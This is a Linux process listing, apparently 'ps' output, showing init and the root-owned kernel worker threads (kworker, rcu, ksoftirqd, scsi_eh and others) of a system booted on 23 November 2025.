    PID USER                      STARTED COMMAND
      1 root     Sun Nov 23 12:16:39 2025 /sbin/init splash
      2 root     Sun Nov 23 12:16:39 2025 [kthreadd]
      3 root     Sun Nov 23 12:16:39 2025 [pool_workqueue_release]
      4 root     Sun Nov 23 12:16:39 2025 [kworker/R-rcu_gp]
      5 root     Sun Nov 23 12:16:39 2025 [kworker/R-sync_wq]
      6 root     Sun Nov 23 12:16:39 2025 [kworker/R-kvfree_rcu_reclaim]
      7 root     Sun Nov 23 12:16:39 2025 [kworker/R-slub_flushwq]
      8 root     Sun Nov 23 12:16:39 2025 [kworker/R-netns]
     12 root     Sun Nov 23 12:16:39 2025 [kworker/u8:0-ipv6_addrconf]
     13 root     Sun Nov 23 12:16:39 2025 [kworker/R-mm_percpu_wq]
     14 root     Sun Nov 23 12:16:39 2025 [rcu_tasks_kthread]
     15 root     Sun Nov 23 12:16:39 2025 [rcu_tasks_rude_kthread]
     16 root     Sun Nov 23 12:16:39 2025 [rcu_tasks_trace_kthread]
     17 root     Sun Nov 23 12:16:39 2025 [ksoftirqd/0]
     18 root     Sun Nov 23 12:16:39 2025 [rcu_preempt]
     19 root     Sun Nov 23 12:16:39 2025 [rcu_exp_par_gp_kthread_worker/0]
     20 root     Sun Nov 23 12:16:39 2025 [rcu_exp_gp_kthread_worker]
     21 root     Sun Nov 23 12:16:39 2025 [migration/0]
     22 root     Sun Nov 23 12:16:39 2025 [idle_inject/0]
     23 root     Sun Nov 23 12:16:39 2025 [cpuhp/0]
     24 root     Sun Nov 23 12:16:39 2025 [cpuhp/1]
     25 root     Sun Nov 23 12:16:39 2025 [idle_inject/1]
     26 root     Sun Nov 23 12:16:39 2025 [migration/1]
     27 root     Sun Nov 23 12:16:39 2025 [ksoftirqd/1]
     32 root     Sun Nov 23 12:16:39 2025 [kdevtmpfs]
     33 root     Sun Nov 23 12:16:39 2025 [kworker/R-inet_frag_wq]
     34 root     Sun Nov 23 12:16:39 2025 [kauditd]
     35 root     Sun Nov 23 12:16:39 2025 [khungtaskd]
     36 root     Sun Nov 23 12:16:39 2025 [oom_reaper]
     38 root     Sun Nov 23 12:16:39 2025 [kworker/R-writeback]
     39 root     Sun Nov 23 12:16:39 2025 [kcompactd0]
     41 root     Sun Nov 23 12:16:39 2025 [ksmd]
     42 root     Sun Nov 23 12:16:39 2025 [khugepaged]
     43 root     Sun Nov 23 12:16:39 2025 [kworker/R-kintegrityd]
     44 root     Sun Nov 23 12:16:39 2025 [kworker/R-kblockd]
     45 root     Sun Nov 23 12:16:39 2025 [kworker/R-blkcg_punt_bio]
     46 root     Sun Nov 23 12:16:39 2025 [irq/9-acpi]
     47 root     Sun Nov 23 12:16:39 2025 [kworker/R-tpm_dev_wq]
     48 root     Sun Nov 23 12:16:39 2025 [kworker/R-ata_sff]
     49 root     Sun Nov 23 12:16:39 2025 [kworker/R-md]
     50 root     Sun Nov 23 12:16:39 2025 [kworker/R-md_bitmap]
     51 root     Sun Nov 23 12:16:39 2025 [kworker/R-edac-poller]
     52 root     Sun Nov 23 12:16:39 2025 [kworker/R-devfreq_wq]
     53 root     Sun Nov 23 12:16:39 2025 [watchdogd]
     54 root     Sun Nov 23 12:16:39 2025 [kworker/0:1H-kblockd]
     55 root     Sun Nov 23 12:16:39 2025 [kswapd0]
     56 root     Sun Nov 23 12:16:39 2025 [ecryptfs-kthread]
     57 root     Sun Nov 23 12:16:39 2025 [kworker/R-kthrotld]
     58 root     Sun Nov 23 12:16:39 2025 [kworker/R-acpi_thermal_pm]
     60 root     Sun Nov 23 12:16:39 2025 [scsi_eh_0]
     61 root     Sun Nov 23 12:16:39 2025 [kworker/R-scsi_tmf_0]
     62 root     Sun Nov 23 12:16:39 2025 [scsi_eh_1]
     63 root     Sun Nov 23 12:16:39 2025 [kworker/R-scsi_tmf_1]
     67 root     Sun Nov 23 12:16:39 2025 [kworker/1:1H-kblockd]
